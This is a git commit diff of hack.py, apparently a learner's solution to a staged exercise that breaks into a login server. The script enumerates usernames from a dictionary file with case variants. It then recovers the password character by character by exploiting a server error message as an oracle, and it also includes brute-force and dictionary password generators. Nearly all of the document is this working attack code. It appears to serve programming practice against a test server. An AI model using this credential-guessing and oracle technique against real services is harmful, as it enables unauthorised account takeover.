22e3b21e1455d5cc1f7bc39e356708c0d7a46290
parseltongist <>
2021-12-16 21:02:11 +0100

    stage 4/5 working

--- hack.py
+++ hack.py
@@ -5,22 +5,14 @@ import string
 import json
 
 
-def password_generator(length=1000000):
+def password_generator(length=1000000) -> str:
     possible_symbols = string.ascii_letters + string.digits
     for i in range(length):
         for message in product(possible_symbols, repeat=i+1):
             yield "".join(message)
 
 
-def connect_to_server(arguments):
-    _ip_address = arguments[1]
-    _port = int(arguments[2])
-    _client_soket = socket.socket()
-    _client_soket.connect((_ip_address, _port))
-    return _client_soket
-
-
-def brute_force(client_socket):  # client_socket
+def brute_force():  # client_socket
     generator = password_generator()
     for message in generator:
         password = ''.join(message)
@@ -41,23 +33,22 @@ def case_generator(_password) -> str:
         yield _password
 
 
-def send_json_message(message):
-    return 'response'
+def send_and_recv_json_request(message) -> str:
+    client_socket.send(message.encode())
+    return client_socket.recv(1024).decode()
 
 
 def try_dictionary_password(_dict_file, _client_socket):
     password_pool = tuple(open(_dict_file).read().split('\n'))
     for password in password_pool:
-        generator = case_generator(password)
-        for pas in generator:
-            _client_socket.send(pas.encode())
-            response = _client_socket.recv(1024).decode()
+        for password_variant in case_generator(password):
+            response = send_and_recv_json_request(password_variant)
             if response == "Connection success!":
-                print(pas)
+                print(password_variant)
                 exit()
 
 
-def hack_login(_dict_file, _client_socket):
+def hack_login(_dict_file):
     # find login first, then find password, then send request
     logins_pool = [login for login in tuple(open(_dict_file).read().split('\n')) if login]
     # iterating throug the loggins pool
@@ -67,12 +58,10 @@ def hack_login(_dict_file, _client_socket):
         # trying options from generator
         for login_variant in generator_logins:
             # creating json message to the server
-            message = {"login": login_variant,
-                       "password": ""}
-            # sending json message to the server
-            _client_socket.send(json.dumps(message).encode())
+            message = {"login": login_variant, "password": ""}
+            # sending json message to the server and
             # reading response from server
-            response = _client_socket.recv(1024).decode()
+            response = send_and_recv_json_request(json.dumps(message))
             # "Wrong login!" should be ignored. once "Wrong password!" message received = login hacked,
             # and need to find the password.
             if json.loads(response)["result"] == "Wrong password!":
@@ -80,28 +69,18 @@ def hack_login(_dict_file, _client_socket):
                 return login_variant
 
 
-def hack_password(_client_socket, login, password_beginning=""):
+def hack_password(login, password_beginning=""):
     for password in password_generator(length=1):
         if password_beginning:
-            password = str(password_beginning) + str(password)
+            password = password_beginning + password
         message = {"login": login, "password": password}
         # reading response from server
-        _client_socket.send(json.dumps(message).encode())
-        response = _client_socket.recv(1024).decode()
-        #print(response)
+        response = send_and_recv_json_request(json.dumps(message))
         if json.loads(response)["result"] == "Exception happened during login":
-            #print(password)
-            password_beginning = password
-            # print("Password at this moment:", password)
-            return hack_password(_client_socket, login, password_beginning)
+            return hack_password(login, password_beginning=password)
         if json.loads(response)["result"] == "Connection success!":
             print(json.dumps(message))
             exit()
-            """
-            print("passsword found:", password)
-            print(json.dumps(message))
-            exit()
-"""
 
 
 def main():
@@ -110,17 +89,18 @@ def main():
     if len(args) < 3:
         print("Not enough arguments. Please provide : ip_address, port, message")
         exit()
-    client_socket = connect_to_server(args)
+    ip_address = args[1]
+    port = int(args[2])
+    global client_socket
+    client_socket = socket.socket()
+    client_socket.connect((ip_address, port))  # connect takes the tuple as an argument
     dictionary_file = "hacking/logins.txt"
     # try_dictionary_password(dictionary_file, client_socket)
-    login = hack_login(dictionary_file, client_socket)
+    login = hack_login(dictionary_file)
     if not login:
         print("sorry, no more logins in DB file")
     else:
-        # print("login succesfully found:", login)
-        # password = hack_password(client_socket, login)
-        #print(password)
-        hack_password(client_socket, login)
+        hack_password(login)
 
     client_socket.close()  # close connection
 
